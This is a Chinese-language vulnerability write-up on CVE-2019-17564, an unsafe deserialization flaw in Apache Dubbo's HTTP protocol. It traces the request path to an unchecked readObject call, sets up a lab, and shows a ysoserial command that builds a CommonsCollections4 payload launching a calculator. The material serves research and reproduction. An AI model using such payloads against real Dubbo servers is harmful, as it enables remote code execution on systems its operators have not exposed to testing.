# （CVE-2019-17564）Apache Dubbo 反序列化漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2812](https://www.zhihuifly.com/t/topic/2812)

# （CVE-2019-17564）Apache Dubbo 反序列化漏洞

## 一、漏洞简介

`Apache Dubbo`支持多种协议，推荐官方使用`Dubbo`协议。`Apache Dubbo HTTP`协议中的一个反序列化漏洞（CVE-2019-17564），漏洞该主要原因的在于当`Apache Dubbo`启用`HTTP`协议之后，`Apache Dubbo`对消息体处理不当导致不安全反序列化，当项目包中存在可用的`gadgets`时即可导致远程代码执行。

## 二、漏洞影响

2.7.0 <= Apache Dubbo <= 2.7.4.1
2.6.0 <= Apache Dubbo <= 2.6.7
Apache Dubbo = 2.5.x

## 三、复现过程

*   1.环境建设

为了环境搭建方便，访问`dubbo-samples`的github项目主页（https://github.com/apache/dubbo-samples）

下载源码以后，分离出http部分

![image](img/666c24a4afdbdf71ad6239846c0d1c6d.png)

修改pom.xml中32行`dubbo.version`

![image](img/e457e33ec316fe1da0f9dff5b2865807.png)

修改其为漏洞版本,以2.7.3为例,随后在Idea中开启即可
修改JDK版本为1.8

![image](img/88b26a880cd11fc58329ef2f85fe418a.png)

随后导入一个可控的gadgets用于分析,例如`commons-collections4-4.0`,并启动`HttpProvider`

![image](img/7cf4b2988b54988090567436777b8962.png)

##### 注:Dubbo启动依赖zookeeper,这部分使用不再赘述,请自行查阅google

*   2.漏洞分析

我们进入`org.apache.dubbo.remoting.http.servlet.DispatcherServlet`在43行`handler.handle(request, response);`处打入断点，利用burp进行发包跟踪它的走向

![image](img/940a8a2b633e680cb47a71fa413796ed.png)

随后发现其进入`org.apache.dubbo.rpc.protocol.http.HttpProtocol`中的`handle`

![image](img/035c6b4ccf2244931da20022d443cda0.png)

进一步跟踪

![image](img/b2f66c26fdcb6ec66e3fbe5743d19259.png)

最终进入`org.springframework.remoting.rmi.RemoteInvocationSerializingExporter`

![image](img/414f632bb803a2a0af7c3cbeed4de4ec.png)

该ois对象来源为报文中post data部分,对于传入的ois并没有做任何安全过滤和检查,直接就行了`readObject`方法导致RCE产生.

![image](img/b041c491a6bffb5ecaf9c5650935777a.png)

很多人不太理解Java反序列化漏洞怎么rce,这里给出一段示例代码

使用`ysoserial`随意生成一个序列化文件,再利用下面的代码读取该序列化文件即可达到效果,可见直接使用`readObject`方法的危害

```
import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class test1 {

public test1() {

}

```
public static void main(String[] args) throws Exception {
    FileInputStream fis = new FileInputStream("/Users/xue/Documents/NetSafe/Tools/JavaTools/1.ser");
    ObjectInputStream ois = new ObjectInputStream(fis);
    ois.readObject();
} 
``` `}` 
```

*   3.漏洞复现

ysoserial下载地址：http://wiki.0-sec.org/download/ysoserial.zip

利用ysoserial生成payload

```
java -jar ysoserial-master-30099844c6-1.jar CommonsCollections4 "calc" > payload.out 
```

将payload粘贴至burp中

![image](img/e00a338f8f99bd6f1988d5741c9f88fa.png)

![image](img/6ce665eae0b3dc4d7a938d8d43076ca9.png)

## 参考链接

> https://qiita.com/shimizukawasaki/items/39c9695d439768cfaeb5

> https://www.cnblogs.com/wh4am1/p/12307848.html